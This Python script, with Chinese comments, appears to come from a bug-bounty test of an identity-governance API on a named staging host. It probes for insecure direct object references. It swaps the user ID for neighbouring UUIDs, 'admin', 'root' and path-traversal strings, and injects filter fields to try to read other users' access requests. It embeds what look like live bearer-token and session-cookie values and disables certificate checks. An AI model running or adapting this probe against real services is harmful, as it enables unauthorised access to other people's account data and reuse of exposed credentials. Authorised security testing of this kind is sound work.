# -*- coding: utf-8 -*-
"""AIC 第十轮:IGA governance IDOR 测试(核心)
基线:自己的 grants/requests
IDOR:替换 userId 为其他值(邻近 UUID/全0/路径穿越/他人格式)
预期结果表:
  成立 -> 换 id 后 403/404/空;targetFilter 注入无效
  不成立(发现) -> 换 id 返回他人数据 / targetFilter 可查他人
"""
import requests, urllib3, json
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
TOKEN = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkYjNkNjM1Ni02MWEwLTQ2ODQtOWVhYS1jMTM1M2RmYTQ0ZDkiLCJjdHMiOiJPQVVUSDJfU1RBVEVMRVNTX0dSQU5UIiwiYXV0aF9sZXZlbCI6MCwiYXVkaXRUcmFja2luZ0lkIjoiZWFiYWVmY2UtODJkZi00NDYyLTkwZTctMTk1YmZkNTAwMDQ1LTM4ODY2NyIsInN1Ym5hbWUiOiJkYjNkNjM1Ni02MWEwLTQ2ODQtOWVhYS1jMTM1M2RmYTQ0ZDkiLCJpc3MiOiJodHRwczovL29wZW5hbS1idWctYm91bnR5LXN0YWcuZm9yZ2VibG9ja3MuY29tOjQ0My9hbS9vYXV0aDIvYWxwaGEiLCJ0b2tlbk5hbWUiOiJhY2Nlc3NfdG9rZW4iLCJ0b2tlbl90eXBlIjoiQmVhcmVyIiwiYXV0aEdyYW50SWQiOiIzS2lQN0tPNTdhU2hhb0RXZkE3SG9nbmNkbEUiLCJjbGllbnRfaWQiOiJlbmRVc2VyVUlDbGllbnQiLCJhdWQiOiJlbmRVc2VyVUlDbGllbnQiLCJuYmYiOjE3ODgyNDc4NzIsImdyYW50X3R5cGUiOiJhdXRob3JpemF0aW9uX2NvZGUiLCJzY29wZSI6WyJmcjppZ2E6KiJdLCJhdXRoX3RpbWUiOjE3ODgyNDc4NjUsInJlYWxtIjoiL2FscGhhIiwiZXhwIjoxNzg4MjUxNDcyLCJpYXQiOjE3ODgyNDc4NzIsImV4cGlyZXNfaW4iOjM2MDAsImp0aSI6IlczV1BMbG91TTZFRVhiX1plZjFiSThzX3c4byIsImdyb3VwcyI6W119.fplQO_Jk7Z8jdecHJWMY5KLrZl_eZikklLXNHYOlJV4'
COOKIE = 'amlbcookie=01; aa942d46ece12ce=tvVfNxaXuVbrr2BzbooZZTz8iTk.*AAJTSQACMDIAAlNLABxZNXdTYkVsVmxPdWdiRlZkeDc3V3doNTJ1VTg9AAR0eXBlAANDVFMAAlMxAAIwMQ..*'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'research-1643',
                  'Authorization': 'Bearer ' + TOKEN,
                  'Cookie': COOKIE,
                  'Content-Type': 'application/json'})

def probe(method, path, body=None):
    try:
        kw = {}
        if body is not None:
            kw['json'] = body
        r = S.request(method, BASE + path, timeout=12, verify=False, **kw)
        print('%-5s %-80s -> %d  %s' % (method, path[:80], r.status_code, r.text[:220].replace('\n', ' ')))
        return r
    except Exception as e:
        print('%-5s %-80s -> ERR %s' % (method, path[:80], str(e)[:60]))

print('=== 1. 基线:自己的 grants ===')
probe('GET', '/iga/governance/user/%s/grants?pageSize=10&pageNumber=0&sortDir=asc&sortBy=role.name&grantType=role' % MY_ID)

print('\n=== 2. IDOR:替换 userId ===')
ID_VARIANTS = [
    'db3d6356-61a0-4684-9eaa-c1353dfa44d8',   # 邻近
    'db3d6356-61a0-4684-9eaa-c1353dfa44da',   # 邻近
    '00000000-0000-0000-0000-000000000000',   # 全 0
    'ffffffff-ffff-ffff-ffff-ffffffffffff',   # 全 f
    'admin', 'administrator', 'root',
    '..', '../..', '..%2F..',
    'me', 'self', 'current',
]
for uid in ID_VARIANTS:
    probe('GET', '/iga/governance/user/%s/grants?pageSize=10&pageNumber=0' % uid)

print('\n=== 3. requests + targetFilter 注入 ===')
BASE_REQ = '/iga/governance/user/%s/requests?_pageSize=0&_status=in-progress&_action=search' % MY_ID
probe('POST', BASE_REQ, {'targetFilter': {'operand': [{'operator': 'EQUALS', 'operand': {'targetName': 'decision.status', 'targetValue': 'in-progress'}}], 'operator': 'AND'}})
# 注入:改 targetName 为 userId 相关字段
probe('POST', BASE_REQ, {'targetFilter': {'operand': [{'operator': 'EQUALS', 'operand': {'targetName': 'userId', 'targetValue': 'admin'}}], 'operator': 'AND'}})
probe('POST', BASE_REQ, {'targetFilter': {'operand': [{'operator': 'EQUALS', 'operand': {'targetName': 'subject', 'targetValue': '*'}}], 'operator': 'AND'}})
probe('POST', BASE_REQ, {'targetFilter': {}})
